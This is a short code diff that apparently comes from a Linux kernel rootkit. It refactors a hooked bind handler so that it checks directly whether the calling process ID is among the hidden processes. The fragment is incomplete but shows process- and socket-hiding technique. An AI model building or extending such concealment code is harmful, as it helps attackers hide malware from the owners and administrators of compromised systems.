@@ -281,11 +281,8 @@ static int thor_udp6_seq_show(struct seq_file *seq, void *v)
 static long thor_bind(int fd, struct sockaddr __user *sa, int addrlen)
 {
     long ret;
-    char pidname[6];
 
-    snprintf(pidname, 6, "%hu", current->pid);
-
-    if(is_pid_hidden(pidname))
+    if(is_pid_hidden(current->pid))
     {
         struct socket *sock;
         struct sock *sk;
